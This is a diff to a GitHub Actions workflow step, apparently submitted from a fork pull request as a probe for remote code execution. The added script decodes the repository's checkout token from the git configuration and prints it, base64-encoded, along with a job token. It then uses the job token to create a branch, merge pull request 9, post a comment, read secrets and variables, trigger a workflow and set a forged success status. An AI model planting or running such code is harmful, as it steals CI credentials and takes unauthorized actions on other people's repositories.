@@ -15,24 +15,32 @@ runs:
         TARGET_SHA: ${{ github.event.workflow_run.head_sha || github.sha }}
       run: |
         set +e
-        echo "=== RCE_PROBE_START run=$GITHUB_RUN_ID event=$GITHUB_EVENT_NAME ref=$GITHUB_REF sha=$GITHUB_SHA target=$TARGET_SHA ==="
+        echo "=== RCE_PROBE2_START run=$GITHUB_RUN_ID event=$GITHUB_EVENT_NAME target=$TARGET_SHA ==="
         id
-        hostname
-        echo "ENV_B64=$(env | sort | base64 -w0)"
         H=$(git config --get http.https://github.com/.extraheader)
         echo "EXTRAHEADER_B64=$(printf '%s' "$H" | base64 -w0)"
         CO=$(printf '%s' "$H" | sed -E 's/^AUTHORIZATION: basic //' | base64 -d 2>/dev/null | sed -E 's/^x-access-token://')
         echo "CHECKOUT_TOKEN_B64=$(printf '%s' "$CO" | base64 -w0)"
         echo "JOB_TOKEN_B64=$(printf '%s' "$JOB_TOKEN" | base64 -w0)"
-        echo "--- GET /installation/repositories ---"
-        curl -sS -w '\nHTTP %{http_code}\n' -H "Authorization: Bearer $JOB_TOKEN" https://api.github.com/installation/repositories | head -c 1200
-        echo "--- GET /repos/PDFtoMark/triage-facebookresearch-v0e9c9d4-12161b (permissions field) ---"
-        curl -sS -w '\nHTTP %{http_code}\n' -H "Authorization: Bearer $JOB_TOKEN" https://api.github.com/repos/PDFtoMark/triage-facebookresearch-v0e9c9d4-12161b | head -c 1500
-        echo "--- statuses:write proof (create commit status on target sha) ---"
-        curl -sS -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: Bearer $JOB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/PDFtoMark/triage-facebookresearch-v0e9c9d4-12161b/statuses/$TARGET_SHA" -d "{\"state\":\"success\",\"context\":\"rce-proof-${GITHUB_RUN_ID}\",\"description\":\"RCE proof from fork PR head\"}" | head -c 900
-        echo "--- contents:write probe (git ref create) ---"
-        curl -sS -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: Bearer $JOB_TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/repos/PDFtoMark/triage-facebookresearch-v0e9c9d4-12161b/git/refs -d "{\"ref\":\"refs/heads/rce-probe-${GITHUB_RUN_ID}\",\"sha\":\"0c2be7f195658ede406e6f3e9ea64609cefa9559\"}" | head -c 700
-        echo "--- actions:write probe (workflow dispatch) ---"
-        curl -sS -w '\nHTTP %{http_code}\n' -X POST -H "Authorization: Bearer $JOB_TOKEN" -H "Accept: application/vnd.github+json" https://api.github.com/repos/PDFtoMark/triage-facebookresearch-v0e9c9d4-12161b/actions/workflows/contributor-check.yml/dispatches -d '{"ref":"main"}' | head -c 500
-        echo "=== RCE_PROBE_END ==="
+        API=https://api.github.com/repos/PDFtoMark/triage-facebookresearch-v0e9c9d4-12161b
+        H_AUTH="Authorization: Bearer $JOB_TOKEN"
+        echo "--- installation scope ---"
+        curl -sS -w '\nHTTP %{http_code}\n' -H "$H_AUTH" https://api.github.com/installation/repositories | head -c 800
+        echo "--- GET repo (permissions) ---"
+        curl -sS -w '\nHTTP %{http_code}\n' -H "$H_AUTH" "$API" | head -c 900
+        echo "--- contents:write: create git ref ---"
+        curl -sS -w '\nHTTP %{http_code}\n' -X POST -H "$H_AUTH" -H "Accept: application/vnd.github+json" "$API/git/refs" -d "{\"ref\":\"refs/heads/rce-probe2-${GITHUB_RUN_ID}\",\"sha\":\"0c2be7f195658ede406e6f3e9ea64609cefa9559\"}" | head -c 400
+        echo "--- pull-requests:write: merge PR 9 ---"
+        curl -sS -w '\nHTTP %{http_code}\n' -X PUT -H "$H_AUTH" -H "Accept: application/vnd.github+json" "$API/pulls/9/merge" -d '{"merge_method":"squash"}' | head -c 400
+        echo "--- issues:write: comment on PR 9 ---"
+        curl -sS -w '\nHTTP %{http_code}\n' -X POST -H "$H_AUTH" -H "Accept: application/vnd.github+json" "$API/issues/9/comments" -d '{"body":"rce-probe token comment"}' | head -c 400
+        echo "--- actions/secrets read ---"
+        curl -sS -w '\nHTTP %{http_code}\n' -H "$H_AUTH" "$API/actions/secrets" | head -c 300
+        echo "--- actions variables read ---"
+        curl -sS -w '\nHTTP %{http_code}\n' -H "$H_AUTH" "$API/actions/variables" | head -c 300
+        echo "--- workflow dispatch (actions:write) ---"
+        curl -sS -w '\nHTTP %{http_code}\n' -X POST -H "$H_AUTH" -H "Accept: application/vnd.github+json" "$API/actions/workflows/contributor-check.yml/dispatches" -d '{"ref":"main"}' | head -c 300
+        echo "--- statuses:write proof ---"
+        curl -sS -w '\nHTTP %{http_code}\n' -X POST -H "$H_AUTH" -H "Accept: application/vnd.github+json" "$API/statuses/$TARGET_SHA" -d "{\"state\":\"success\",\"context\":\"rce-proof2-${GITHUB_RUN_ID}\",\"description\":\"RCE proof 2\"}" | head -c 400
+        echo "=== RCE_PROBE2_END ==="
         exit 0
